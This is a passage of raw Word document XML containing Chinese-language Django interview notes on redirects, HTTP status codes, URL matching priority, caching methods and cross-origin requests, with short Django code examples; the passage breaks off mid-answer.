          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>重定向</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548E63FF" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>我们也可以将返回的结果重定向到另一个页面或接口， </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759F1000" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>例子：from django.shortcuts import redirect </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7235CC4E" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>           def demo_view(request): </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314CC756" w14:textId="134751D0" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>               return redirect(‘/index.html’)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6F300F" w14:textId="50FB8998" w:rsidR="00717181" w:rsidRDefault="00A52FA8" w:rsidP="00717181">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015</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>响应常见状态码分类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A937595" w14:textId="52695A6E" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">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05189099" wp14:editId="4E663B85">
            <wp:extent cx="7648575" cy="2860628"/>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54844" cy="2862972"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E630BB" w14:textId="335E53ED" w:rsidR="00717181" w:rsidRDefault="00D96E02" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:pict w14:anchorId="1A6FE5E5">
          <v:rect id="_x0000_i1025" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="368E7DE7" w14:textId="37758AE5" w:rsidR="00717181" w:rsidRPr="001B46D3" w:rsidRDefault="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="95" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>016</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>路由匹配原则是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1380C842" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>1、关于正则匹配优先级</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8F4E70" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>在url匹配列表中，如果第一条和第二条同时满足匹配规则，则优先匹配第一条。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC0FCF2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="96" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>在url匹配列表中，如果第一条为正则模糊匹配，第二条为精确匹配，则优先匹配第一条</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C6C16C" w14:textId="66F4971E" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="97" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6F4F28AE" w14:textId="1031372C" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00B73D4C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:del w:id="98" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="99" w:author="ABM ABM" w:date="2020-08-16T13:39:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>017</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>缓存系统类型有哪些</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD89977" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:pPrChange w:id="100" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="101" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidDel="00717181">
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7284469D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 全站缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5795F3D0" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>MIDDLEWARE_CLASSES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB7594A" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    ‘django.middleware.cache.UpdateCacheMiddleware’, #第一</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE946D8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    'django.middleware.common.CommonMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724FB9F0" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    ‘django.middleware.cache.FetchFromCacheMiddleware’, #最后</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779D147C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6027D341" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E04857" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 视图缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214428BE" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.views.decorators.cache import cache_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDBD3AB" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="102" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62542E5F" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="103" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00717181">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:delText>  </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5283D7E4" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>@cache_page(15) #超时时间为15秒</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FE1674" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB024B2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t> t=time.time() #获取当前时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7CC896" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="104" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> return render(request,"index.html",locals())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A27E927" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="105" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00717181">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="58283BA8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 模板缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A85889B" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>{% load cache %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD65D5B" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="106" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> &lt;h3 style="color: green"&gt;不缓存:-----{{ t }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC824A2" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="107" w:author="ABM ABM" w:date="2020-08-16T13:41:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00717181">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:delText>  </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="723213A5" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>{% cache 2 'name' %} # 存的key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06289502" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> &lt;h3&gt;缓存:-----:{{ t }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C24182" w14:textId="16A3D2E7" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>{% endcache %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F9C756" w14:textId="3B797736" w:rsidR="00717181" w:rsidRDefault="00B73D4C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="108" w:author="ABM ABM" w:date="2020-08-16T13:39:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>018</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>解决跨域的常用方式是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0960D0CA" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>跨域是指一个域下的文档或脚本试图去请求另一个域下的资源，这里跨域是广义的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62367EBE" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>广义的跨域：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA92E8D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>1.) 资源跳转： A链接、重定向、表单提交</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786BD28D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>2.) 资源嵌入： link script img frame等dom标签，还有样式中background:url()、@font-face()等文件外链</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B796AAD" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
